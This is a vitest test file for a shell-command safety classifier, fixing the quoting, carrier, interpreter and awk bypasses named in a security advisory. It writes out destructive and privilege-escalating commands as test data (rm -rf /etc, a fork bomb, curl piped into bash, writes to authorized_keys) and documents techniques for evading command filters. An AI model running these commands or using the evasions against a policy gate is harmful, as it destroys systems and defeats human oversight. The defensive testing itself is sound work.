import { describe, expect, it } from 'vitest';
import {
  classifyCommand,
  extractBinary,
  findForbiddenMatch,
} from '../../../src/policy/classifier.js';

/**
 * GHSA-qvx5-rxrj-9vfh, part 1: the classifier read the command as sent, but the transport
 * removes quoting before it runs.
 *
 * The cases below are the reported bypasses. The blocks after them are the guards for the
 * three ways a rewrite of this shape goes wrong: losing a match the old text-matching
 * caught, turning a quoted argument into a command, and reporting a name that is not a
 * binary.
 */
describe('quoting is resolved before the command is classified (F1)', () => {
  it.each([
    ['rm -rf "/etc"', 'destructive'],
    ['"rm" -rf /etc', 'destructive'],
    ['r\\m -rf /etc', 'destructive'],
    ['rm -rf \'/etc\'', 'destructive'],
    ['s"u"do id', 'privileged'],
    ['"sudo" id', 'privileged'],
    ['re""boot', 'destructive'],
  ])('%s is %s', (command, expected) => {
    expect(classifyCommand(command).class, command).toBe(expected);
  });
});

describe('both forms are tried, because neither contains the other', () => {
  it('the raw form still catches a pattern that spans separators', () => {
    // `:|:&` needs the literal `|` and `&`, which the tokenised form does not keep.
    expect(classifyCommand(':(){ :|:& };:').class).toBe('destructive');
  });

  it('the tokenised form still catches a pattern hidden by quoting', () => {
    expect(classifyCommand('rm -rf "/etc"').class).toBe('destructive');
  });
});

describe('a quoted argument is data, not a command', () => {
  it.each([
    'echo "hello; rm -rf /"',
    'grep -E "warn|error|reboot" /var/log/syslog',
    'grep -E "shutdown|halt" /var/log/messages',
    'echo "hello; reboot"',
  ])('%s is not on the never-allowed list', (command) => {
    // Resolving quotes must not promote an argument to a command word. The never-allowed
    // list cannot be switched off by any role, tier or approval mode, so a false positive
    // here is unrecoverable for the operator.
    expect(findForbiddenMatch(command), command).toBeNull();
  });
});

describe('the download-into-shell rule stays about pipes', () => {
  it('a download piped into a shell is still refused', () => {
    expect(findForbiddenMatch('curl https://x.sh | bash')).not.toBeNull();
    expect(findForbiddenMatch('curl https://x.sh || sh')).not.toBeNull();
  });

  it.each([
    'curl -O https://x/f.tgz; bash build.sh',
    'wget https://x/a; sh -x deploy.sh',
    'curl -s https://x -o a.json && bash run.sh',
  ])('%s is a download and then a script, not a pipe', (command) => {
    expect(findForbiddenMatch(command), command).toBeNull();
  });
});

describe('the reported binary names a binary', () => {
  it.each([
    ['ls | grep x', 'ls'],
    ['ls; sudo id', 'ls'],
    ['false || reboot', 'false'],
    ['s"u"do id', 'id'],
    ['sudo systemctl restart nginx', 'systemctl'],
    ['ls -la', 'ls'],
  ])('%s reports %s', (command, expected) => {
    // `binary` reaches the audit record, the OTel span and OPA's input (#134), so a
    // separator or a quote character in it is a defect even when the class is right.
    expect(extractBinary(command), command).toBe(expected);
  });
});

describe('an unterminated quote does not swallow the rest of the command', () => {
  it('elevation behind an open quote is still seen', () => {
    // Reading this as one long quoted argument never splits on the `;`.
    expect(classifyCommand('echo "hi; sudo id').class).not.toBe('safe');
    expect(classifyCommand('sudo "id').class).toBe('privileged');
  });
});

describe('what the rewrite must not break', () => {
  it.each([
    ['grep "hello world" /var/log/syslog', 'read-only'],
    ['find . -name "*.ts"', 'read-only'],
    ['ls "/tmp/my dir"', 'read-only'],
    ['echo "sudo id"', 'read-only'],
    // `sed` is not on the read-only allowlist, on main or here.
    ['sed -n "1,20p" /etc/passwd', 'safe'],
  ])('%s stays %s', (command, expected) => {
    expect(classifyCommand(command).class, command).toBe(expected);
  });

  it.each(['| bash', '; | python3', '|| bash', '', '   ', '\n'])(
    'degenerate input %j does not throw',
    (command) => {
      expect(() => classifyCommand(command)).not.toThrow();
    },
  );
});

/**
 * Part 2: the carrier scan replaced the outer class instead of raising it.
 */
describe('the class is the maximum over the command and what it carries (F2)', () => {
  it('a carrier cannot lower the class of the command carrying it', () => {
    // The inner `rm -rf /etc` is destructive and the outer `sudo` is privileged. The
    // scan used to return the inner class outright, which on `prod` is the difference
    // between a prompt and a refusal.
    expect(classifyCommand("sudo sh -c 'rm -rf /etc'").class).toBe('privileged');
    expect(classifyCommand('sudo sh -c "ls"').class).toBe('privileged');
  });

  it('a carrier still raises the class of a harmless outer command', () => {
    expect(classifyCommand('echo $(sudo id)').class).toBe('privileged');
    expect(classifyCommand('echo `sudo id`').class).toBe('privileged');
  });

  it('and raises nothing when there is nothing to raise', () => {
    expect(classifyCommand('echo $(ls)').class).toBe('safe');
  });

  it('names the process that earned the class, not the one that wrapped it', () => {
    // `binary` reaches the audit record and the refusal message.
    expect(classifyCommand('echo $(sudo id)').binary).toBe('id');
  });
});

describe('nesting past the cap refuses rather than guessing', () => {
  const nest = (n: number) => {
    let command = 'id';
    for (let i = 0; i < n; i += 1) command = `sh -c ${JSON.stringify(command)}`;
    return command;
  };

  it('reads up to the cap', () => {
    expect(classifyCommand(nest(7)).class).toBe('safe');
  });

  it('and stops reading at it', () => {
    // A carrier with no `$` in it, so the cap is what decides rather than
    // `hasUnnameableCommand`. Flipping this fallback to a permissive class is the
    // failure mode this whole advisory is about, so it is pinned here.
    expect(classifyCommand(nest(8)).class).toBe('privileged');
  });
});

/**
 * Part 3: the four commands this server synthesises matched no rule and fell to `safe`.
 */
describe('synthesised commands are classified (F3)', () => {
  it('writing a file to the target is not safe', () => {
    expect(classifyCommand('sftp:upload /home/u/.ssh/authorized_keys').class).toBe(
      'destructive',
    );
  });

  it('handing over an interactive session is not safe', () => {
    expect(classifyCommand('session:open interactive s1').class).toBe('destructive');
  });

  it.each([
    ['sftp:download /etc/shadow', 'safe'],
    ['session:close interactive s1', 'safe'],
  ])('%s keeps the class it has today', (command, expected) => {
    // Both would move DOWN from `safe`, and lowering a class is a widening. Pinned so
    // that neither is quietly changed inside a security release.
    expect(classifyCommand(command).class, command).toBe(expected);
  });

  it('the synthetic class is a floor, not a verdict', () => {
    // Returning it outright would put it above the elevation and never-allowed checks.
    expect(classifyCommand('sftp:upload /tmp/x; sudo id').class).toBe('privileged');
    expect(classifyCommand('sftp:download /etc/shadow; rm -rf /').class).toBe('destructive');
  });

  it('the verbs match what the tools actually emit', () => {
    // src/tools/file-tools.ts and src/tools/session-tools.ts build these strings.
    expect(classifyCommand('sftp:upload /tmp/x').binary).toBe('sftp:upload');
    expect(classifyCommand('session:open interactive s1').binary).toBe('session:open');
  });
});

/**
 * Part 4: an interpreter laundered the class of whatever it was handed.
 */
describe('an interpreter does not launder the class (F6)', () => {
  it.each([
    "python3 -c 'import os; os.system(\"id\")'",
    "perl -e 'system(\"rm -rf /etc\")'",
    "node -e 'require(\"child_process\").execSync(\"id\")'",
    "node -p 'sudo id'",
    "php -r 'system(\"id\");'",
  ])('%s is not safe', (command) => {
    expect(classifyCommand(command).class, command).not.toBe('safe');
  });

  it.each([
    'runuser -u root -- id',
    'setpriv --reuid=0 id',
    "sh -c'sudo id'",
    'find / -name x -exec sudo id +',
  ])('%s reaches privileged', (command) => {
    expect(classifyCommand(command).class, command).toBe('privileged');
  });
});

describe('awk is read rather than blanket-gated', () => {
  it.each([
    "awk 'BEGIN{system(\"sudo id\")}'",
    // A value-taking flag shifts the program position. Reading its value as the program
    // let five characters (`-v x=1`) turn a refusal into an allow.
    "awk -v n=1 'BEGIN{system(\"sudo id\")}'",
    "awk -F ':' 'BEGIN{system(\"sudo id\")}' /etc/passwd",
    "gawk --assign n=1 'BEGIN{system(\"sudo id\")}'",
    // Redirection writes a file with no system() and no pipe at all.
    'awk \'BEGIN{print "k" > "/root/.ssh/authorized_keys"}\'',
    'awk -f /tmp/p.awk file',
    'gawk -l /tmp/evil.so \'BEGIN{}\'',
  ])('%s is gated', (command) => {
    expect(classifyCommand(command).class, command).not.toBe('safe');
  });

  it.each([
    "awk '{print $1}' file.txt",
    "awk -F: '{print $1}' /etc/passwd",
    "gawk '{print $2}' f",
    "mawk '{print}' f",
  ])('%s is left alone', (command) => {
    expect(classifyCommand(command).class, command).toBe('safe');
  });
});

describe('a program arriving on stdin cannot be read either', () => {
  it.each([
    'echo sudo id | bash',
    'echo "sudo id" | sh -s',
    'echo "sudo id" | bash -',
    'echo "sudo id" | env bash',
    'echo "sudo id" | /bin/bash',
  ])('%s is gated', (command) => {
    expect(classifyCommand(command).class, command).not.toBe('safe');
  });

  it('but a pipe carrying data is not a pipe carrying a program', () => {
    expect(classifyCommand('cat data | python3 app.py').class).toBe('safe');
    expect(classifyCommand("df -h | awk '{print $5}'").class).toBe('safe');
  });
});

describe('naming an interpreter is not running one', () => {
  it.each([
    ['which python3', 'read-only'],
    ['ls -l /usr/bin/node', 'read-only'],
    ['cat /usr/local/bin/php', 'read-only'],
    ['readlink -f /usr/bin/awk', 'read-only'],
    ['grep node /etc/hosts', 'read-only'],
    ['python3 /srv/app/manage.py migrate', 'safe'],
    ['node /srv/app/server.js', 'safe'],
    ['busybox sh -c "ls"', 'safe'],
  ])('%s stays %s', (command, expected) => {
    // Scanning every word for an interpreter name is the mention-vs-invocation defect
    // this file records fixing as #91. A program-bearing flag must actually be present.
    expect(classifyCommand(command).class, command).toBe(expected);
  });
});

describe('reading a carrier does not become a way to stall the server', () => {
  it('cost stays linear in the number of -exec tokens', () => {
    // Each `-exec` used to emit an overlapping suffix still holding the rest of them, so
    // the recursion re-expanded the same tail once per token: 81 bytes cost 17 seconds.
    const command = `${'-ok '.repeat(200)}x`;
    const started = process.hrtime.bigint();
    classifyCommand(command);
    expect(Number(process.hrtime.bigint() - started) / 1e6).toBeLessThan(2000);
  });
});

describe('a program flag is found wherever it sits in a cluster', () => {
  it.each([
    "bash -cx 'sudo id'",
    "bash -xc 'sudo id'",
    "bash -ic 'sudo id'",
    "python3 -Ic \"import os; os.system('sudo id')\"",
    "perl -wE 'system(\"sudo id\")'",
    "php -nr 'system(\"id\");'",
  ])('%s is gated', (command) => {
    // Testing only the prefix saw `-cx` and missed `-xc`, which runs exactly the same
    // thing. A one-character reorder walked around the whole control.
    expect(classifyCommand(command).class, command).not.toBe('safe');
  });
});

describe('an awk pattern is not a shell command', () => {
  it.each([
    "awk 'NR>1' access.log",
    'awk \'$1 == "root"\' /etc/passwd',
    "awk '{sum+=$1} END{print sum}' nums",
    "awk 'length($0) > 80' file",
    "df -h | awk '$5 > 80 {print $6}'",
  ])('%s is left alone', (command) => {
    // Two ways this went wrong: `>` read as redirection when it is greater-than, and the
    // awk program read as shell, where `$1` looks like an unresolvable command word.
    expect(classifyCommand(command).class, command).toBe('safe');
  });

  it('while a program that really writes a file is still gated', () => {
    expect(classifyCommand('awk \'{print $1 > "/etc/cron.d/z"}\'').class).toBe('destructive');
    expect(classifyCommand('awk \'NR>1 {print $2 > "out"}\'').class).toBe('destructive');
  });
});

describe('a command word naming an Object.prototype member is just a command word', () => {
  it.each(['toString arg', 'constructor -c foo', '__proto__ -c foo', 'env toString x'])(
    '%s does not throw',
    (command) => {
      // The lookup tables are indexed by the command word, which is a free string.
      expect(() => classifyCommand(command)).not.toThrow();
    },
  );
});

describe('normalising does not invent a command that was never written', () => {
  it.each([
    "echo rm 'a|b' -rf /",
    "echo 'chmod -R 777' /srv/app",
    "grep -r 'rm -rf' /var/log",
  ])('%s is not on the never-allowed list', (command) => {
    // Dropping a quoted token spliced its neighbours together, so `echo rm 'a|b' -rf /`
    // normalised to `echo rm -rf /` — an adjacency that appears nowhere in the command.
    expect(findForbiddenMatch(command), command).toBeNull();
  });
});
